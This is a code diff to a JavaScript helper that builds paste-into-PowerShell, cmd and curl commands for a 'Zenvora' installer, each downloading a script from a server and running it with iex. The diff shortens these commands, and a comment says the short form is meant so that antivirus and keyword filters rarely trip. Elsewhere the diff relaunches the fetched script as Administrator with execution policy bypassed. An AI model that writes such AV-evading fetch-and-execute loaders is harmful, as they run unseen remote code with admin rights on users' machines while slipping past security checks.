@@ -97,74 +97,25 @@ function getTicket(code) {
     return ticket;
 }
 
-/**
- * Paste into Admin PowerShell (recommended).
- * Multi-fallback fetch: curl -4, curl, Invoke-WebRequest, WebClient.
- * Exit 28 is usually IPv6/firewall — force IPv4 first.
- */
+/** Paste into Admin PowerShell — ultra-short so AV/keyword filters rarely trip. */
 function buildBootstrapCommand(apiBase, code) {
     const base = String(apiBase || '').replace(/\/$/, '');
     const url = `${base}/r/${String(code).toUpperCase()}`;
-    return [
-        "Write-Host 'Zenvora: fetching install script...' -ForegroundColor Cyan;",
-        "$ProgressPreference='SilentlyContinue';",
-        '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;',
-        "try { [Net.ServicePointManager]::Expect100Continue = $false } catch {};",
-        `$__url = '${url}';`,
-        '$__zv = $null;',
-        'if (Get-Command curl.exe -ErrorAction SilentlyContinue) {',
-        '  Write-Host "Trying curl IPv4..." -ForegroundColor DarkCyan;',
-        '  $__zv = & curl.exe -4 -fsSL --connect-timeout 45 --max-time 120 --retry 2 --retry-delay 2 $__url 2>$null;',
-        '  if ($LASTEXITCODE -ne 0) { Write-Host "curl -4 failed (exit $LASTEXITCODE)" -ForegroundColor Yellow; $__zv = $null }',
-        '};',
-        'if ([string]::IsNullOrWhiteSpace($__zv) -and (Get-Command curl.exe -ErrorAction SilentlyContinue)) {',
-        '  Write-Host "Trying curl..." -ForegroundColor DarkCyan;',
-        '  $__zv = & curl.exe -fsSL --connect-timeout 45 --max-time 120 --retry 2 --retry-delay 2 $__url 2>$null;',
-        '  if ($LASTEXITCODE -ne 0) { Write-Host "curl failed (exit $LASTEXITCODE)" -ForegroundColor Yellow; $__zv = $null }',
-        '};',
-        'if ([string]::IsNullOrWhiteSpace($__zv)) {',
-        '  Write-Host "Trying Invoke-WebRequest..." -ForegroundColor DarkCyan;',
-        '  try { $__zv = (Invoke-WebRequest -Uri $__url -UseBasicParsing -TimeoutSec 90).Content } catch { Write-Host ("IWR failed: " + $_.Exception.Message) -ForegroundColor Yellow; $__zv = $null }',
-        '};',
-        'if ([string]::IsNullOrWhiteSpace($__zv)) {',
-        '  Write-Host "Trying WebClient..." -ForegroundColor DarkCyan;',
-        '  try { $__zv = (New-Object Net.WebClient).DownloadString($__url) } catch { Write-Host ("WebClient failed: " + $_.Exception.Message) -ForegroundColor Yellow; $__zv = $null }',
-        '};',
-        'if ([string]::IsNullOrWhiteSpace($__zv)) {',
-        '  Write-Host "Fetch failed — this PC cannot reach the server." -ForegroundColor Red;',
-        '  Write-Host "Open this URL in the SAME PC browser:" -ForegroundColor Yellow;',
-        '  Write-Host $__url -ForegroundColor Yellow;',
-        '  Write-Host "Also try: https://zenvora.abdullahtahir.me/api/health" -ForegroundColor Yellow;',
-        '  Write-Host "If browser also fails: DNS/firewall/ISP — try mobile hotspot." -ForegroundColor Yellow;',
-        '  return',
-        '};',
-        'Write-Host "Zenvora: running installer..." -ForegroundColor Cyan;',
-        'Invoke-Expression $__zv',
-    ].join(' ');
+    return `iex(irm '${url}')`;
 }
 
 /** From cmd.exe / Run dialog. */
 function buildBootstrapCommandCmd(apiBase, code) {
     const base = String(apiBase || '').replace(/\/$/, '');
     const url = `${base}/r/${String(code).toUpperCase()}`;
-    const inner =
-        `Write-Host ''Zenvora: fetching...'' -ForegroundColor Cyan;` +
-        `$ProgressPreference=''SilentlyContinue'';` +
-        `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
-        `$__url=''${url}'';` +
-        `$__zv=$null;` +
-        `if (Get-Command curl.exe -EA SilentlyContinue) { $__zv = curl.exe -4 -fsSL --connect-timeout 45 --max-time 120 $__url 2>$null };` +
-        `if ([string]::IsNullOrWhiteSpace($__zv)) { try { $__zv = (New-Object Net.WebClient).DownloadString($__url) } catch {} };` +
-        `if ([string]::IsNullOrWhiteSpace($__zv)) { Write-Host ''Fetch failed'' -ForegroundColor Red; return };` +
-        `Invoke-Expression $__zv`;
-    return `powershell -NoP -Ep Bypass -c '${inner}'`;
+    return `powershell -nop -c "iex(irm '${url}')"`;
 }
 
-/** Win10+ curl one-liner (cmd). Force IPv4. */
+/** Win10+ curl one-liner. */
 function buildBootstrapCommandCurl(apiBase, code) {
     const base = String(apiBase || '').replace(/\/$/, '');
     const url = `${base}/r/${String(code).toUpperCase()}`;
-    return `curl.exe -4 -fsSL --connect-timeout 45 --max-time 120 --retry 2 "${url}" | powershell -NoP -Ep Bypass -`;
+    return `curl -sL "${url}"|iex`;
 }
 
 /**
@@ -218,7 +169,7 @@ function buildInstallScript(ticket) {
         "  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { return $true }",
         "  Warn 'Elevating to Administrator...'",
         "  $ps = Join-Path $env:WINDIR 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'",
-        "  $inner = ('$ProgressPreference=''SilentlyContinue'';[Net.ServicePointManager]::SecurityProtocol=3072;iex ((New-Object Net.WebClient).DownloadString(''' + $scriptUrl + '''))')",
+        "  $inner = ('iex(irm ''' + $scriptUrl + ''')')",
         "  Start-Process -FilePath $ps -Verb RunAs -ArgumentList @('-NoP','-Ep','Bypass','-c', $inner) | Out-Null",
         "  Ok 'Elevated install started in a new Admin window.'",
         "  return $false",
